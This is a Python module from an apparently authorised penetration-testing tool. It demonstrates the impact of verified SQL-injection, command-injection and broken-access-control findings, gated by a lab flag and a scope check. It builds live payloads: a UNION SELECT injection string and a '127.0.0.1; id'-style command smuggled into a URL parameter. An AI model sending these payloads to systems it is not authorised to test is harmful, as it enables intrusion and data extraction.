"""Impact proof: demonstrate impact, separately from a verified finding.

A VERIFIED finding means an independent replay reproduced the recorded signal.
It does not mean impact was demonstrated. This module runs only when the
operator explicitly authorizes a lab:

    auth_json['test_hints']['impact_proof']['lab'] is true

and the finding's own proof URL is inside the engagement scope. Absent, false
or out-of-scope means no request is sent. Authorization is never inferred from
the finding's class or severity.

Destructive or persistent actions are out of scope for this module: it only
reads data and only runs the read-only, side-effect-free commands allowlisted
below. A response that merely differs from a control is not impact; the
declared marker, sensitive field or command output must be present verbatim.
"""
import json
import re
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

IDENT = re.compile(r"^[A-Za-z_][\w.]{0,62}$")
# Read-only, side-effect-free commands only. Never a write, download or shell.
READ_ONLY_COMMANDS = ("id", "whoami", "uname -a")
COMMAND_OUTPUT = {
    "id": re.compile(r"uid=\d+"),
    "whoami": re.compile(r"(?m)^[A-Za-z_][\w.@-]{0,63}$"),
    "uname -a": re.compile(r"\b(?:Linux|Darwin|FreeBSD|OpenBSD)\b"),
}
CLASSES = {"CWE-89": "sql_injection",
           "CWE-639": "cross_identity", "CWE-284": "cross_identity",
           "CWE-285": "cross_identity",
           "CWE-78": "command_execution", "CWE-94": "command_execution"}


def _proof_request(db, evidence, finding: dict) -> dict | None:
    """The finding's replayable proof request, inline or from its proof_spec evidence."""
    pr = finding.get("proof_request")
    if isinstance(pr, dict):
        return pr
    for eid in reversed(json.loads(finding.get("evidence_ids_json") or "[]")):
        row = db.one("SELECT kind FROM evidence WHERE id=?", (eid,))
        if row and row["kind"] == "proof_spec":
            try:
                return evidence.read_json(eid).get("proof_request")
            except (ValueError, KeyError, OSError):
                return None
    return None


def _param(url: str, hint: dict) -> str | None:
    """The injectable parameter: declared, or the proof URL's only query parameter."""
    if isinstance(hint.get("param"), str) and hint["param"]:
        return hint["param"]
    query = parse_qs(urlparse(url).query)
    return next(iter(query)) if len(query) == 1 else None


def _inject(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    query = parse_qs(parsed.query, keep_blank_values=True)
    query[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(query, doseq=True)))


def _send(probe, engagement_id, scope, intent_id, url, headers):
    return probe.request(engagement_id, scope, url, method="GET", headers=headers,
                         category="web", intent_id=intent_id, tool="impact_proof")


def _quote_span(body: str, needles: list[str]) -> str | None:
    """The shortest contiguous span of the body covering every needle."""
    spans = []
    for needle in needles:
        i = body.find(needle)
        if i < 0:
            return None
        spans.append((i, i + len(needle)))
    start, end = min(s for s, _ in spans), max(e for _, e in spans)
    return body[start:end] if end - start <= 300 else None


def _sensitive(body: str, fields: list) -> tuple[str, str, str] | None:
    """(field, value, raw pair) for the first declared sensitive field in the body."""
    try:
        data = json.loads(body)
    except (TypeError, ValueError):
        data = None
    for field in fields:
        if not isinstance(field, str) or not field:
            continue
        if isinstance(data, dict) and field in data and data[field] not in (None, ""):
            value = str(data[field])
            match = re.search(rf'"{re.escape(field)}"\s*:\s*{re.escape(json.dumps(value))}', body)
            return field, value, (match.group(0) if match else f'"{field}": {value}')
        match = (re.search(rf'"{re.escape(field)}"\s*:\s*("[^"]*"|-?\d+)', body)
                 or re.search(rf'(?m)^{re.escape(field)}\s*[:=]\s*("[^"]*"|[^\s,&]+)', body))
        if match:
            return field, match.group(1).strip('"'), match.group(0)
    return None


def _demonstrate(out, pipeline, engagement_id, intent_id, finding_id, cls, summary, r, quote):
    out["impact"].append({"class": cls, "finding_id": finding_id, "quote": quote,
                          "evidence_id": r.get("evidence_id"),
                          "exchange_id": r.get("exchange_id"), "summary": summary})
    out["observations"].append(summary)
    out["status"] = "demonstrated"
    pipeline.record_observation(engagement_id, intent_id, "impact_demonstrated", summary,
                                evidence_id=r.get("evidence_id"), quote=quote)


def prove_impact(db, evidence, probe, scope, engagement_id: str, finding: dict,
                 auth_json: dict, pipeline, intent_id: str | None = None) -> dict:
    """Attempt a lab-authorized impact proof for one finding.

    Returns {status: demonstrated|not_attempted|refused|failed, impact: [...],
    observations: [...], limitations: [...]}. Each demonstrated impact binds the
    exchange that returned it and records an ``impact_demonstrated`` observation.
    """
    out = {"status": "not_attempted", "impact": [], "observations": [], "limitations": []}

    def limit(summary: str, status: str = "not_attempted"):
        out["limitations"].append(summary)
        out["status"] = status

    hint = ((auth_json or {}).get("test_hints") or {}).get("impact_proof")
    if not isinstance(hint, dict) or hint.get("lab") is not True:
        limit("impact proof not authorized: test_hints.impact_proof.lab must be true; "
              "no request was sent")
        return out

    finding_id = finding.get("id") or finding.get("finding_id")
    cwe = str(finding.get("cwe") or "").upper()
    cls = CLASSES.get(cwe)
    if cls is None:
        limit(f"no impact proof defined for {cwe or 'this finding class'}; no request was sent")
        return out

    pr = _proof_request(db, evidence, finding)
    if not isinstance(pr, dict) or not isinstance(pr.get("url"), str) or not pr["url"]:
        limit("finding carries no replayable proof_request; impact cannot be targeted; "
              "no request was sent")
        return out
    url = pr["url"]
    if str(pr.get("method") or "GET").upper() != "GET":
        limit(f"impact proof supports GET proofs only (finding proof is {pr.get('method')}); "
              "no request was sent")
        return out

    headers = pr.get("headers") if isinstance(pr.get("headers"), dict) else None

    if cls == "command_execution":
        command = " ".join(str(hint.get("command") or "id").split())
        if command not in READ_ONLY_COMMANDS:
            limit(f"command {command!r} is outside the read-only allowlist "
                  f"{list(READ_ONLY_COMMANDS)}; refused, no request was sent", "refused")
            return out

    decision = scope.check_url(url, "web")
    if not decision.allowed:
        limit(f"target {url} is outside the engagement scope ({decision.reason}); "
              "impact proof refused, no request was sent", "refused")
        return out

    if cls == "sql_injection":
        markers = hint.get("markers")
        markers = [markers] if isinstance(markers, dict) else markers
        if not isinstance(markers, list) or not markers:
            limit("impact_proof.markers must declare a {table, column, value} marker; "
                  "no request was sent")
            return out
        param = _param(url, hint)
        if not param:
            limit("no injectable parameter: set impact_proof.param or leave one query "
                  "parameter on the proof URL; no request was sent")
            return out
        for marker in markers:
            marker = marker if isinstance(marker, dict) else {}
            table, column, value = marker.get("table"), marker.get("column"), marker.get("value")
            if not (isinstance(table, str) and IDENT.match(table)
                    and isinstance(column, str) and IDENT.match(column)
                    and isinstance(value, str) and value):
                limit(f"invalid marker {marker!r}: table/column must be identifiers and "
                      "value a non-empty string; no request was sent")
                return out
            out["status"] = "failed"
            payload = f"0' UNION SELECT {column} FROM {table} -- "
            r = _send(probe, engagement_id, scope, intent_id, _inject(url, param, payload), headers)
            body = r.get("body") or ""
            if not r.get("ok") or value not in body:
                limit(f"marker value absent: {table}.{column} did not return {value!r} "
                      f"through parameter '{param}' ({r.get('error') or 'response had no marker'})",
                      "failed")
                continue
            _demonstrate(out, pipeline, engagement_id, intent_id, finding_id, cls,
                         f"extracted {table}.{column} = {value!r} through parameter '{param}'",
                         r, value)

    elif cls == "cross_identity":
        fields = hint.get("sensitive_fields")
        if not isinstance(fields, list) or not fields:
            limit("impact_proof.sensitive_fields must name the field that proves "
                  "cross-identity data; no request was sent")
            return out
        object_id = hint.get("object_id") or urlparse(url).path.rstrip("/").rsplit("/", 1)[-1]
        object_id = str(object_id or "")
        if not object_id:
            limit("no other identity's object id: set impact_proof.object_id; no request was sent")
            return out
        out["status"] = "failed"
        r = _send(probe, engagement_id, scope, intent_id, url, headers)
        body = r.get("body") or ""
        found = _sensitive(body, fields) if r.get("ok") else None
        if not found or object_id not in body:
            limit(f"no cross-identity data: object {object_id} returned none of "
                  f"{fields} ({r.get('error') or 'field absent'})", "failed")
            return out
        field, value, pair = found
        quote = _quote_span(body, [pair, object_id]) or pair
        _demonstrate(out, pipeline, engagement_id, intent_id, finding_id, cls,
                     f"read object {object_id} as another identity: {field} = {value!r}",
                     r, quote)

    else:  # command_execution, allowlist already asserted
        command = " ".join(str(hint.get("command") or "id").split())
        param = _param(url, hint)
        if not param:
            limit("no injectable parameter: set impact_proof.param or leave one query "
                  "parameter on the proof URL; no request was sent")
            return out
        out["status"] = "failed"
        r = _send(probe, engagement_id, scope, intent_id,
                  _inject(url, param, f"127.0.0.1; {command}"), headers)
        match = COMMAND_OUTPUT[command].search(r.get("body") or "") if r.get("ok") else None
        if not match:
            limit(f"command output absent: {command!r} produced no distinguishable output "
                  f"through parameter '{param}' ({r.get('error') or 'no match'})", "failed")
            return out
        _demonstrate(out, pipeline, engagement_id, intent_id, finding_id, cls,
                     f"executed {command!r} through parameter '{param}'", r, match.group(0))

    db.emit(engagement_id, "impact_proof_complete",
            {"finding_id": finding_id, "class": cls, "status": out["status"],
             "demonstrated": len(out["impact"])})
    return out
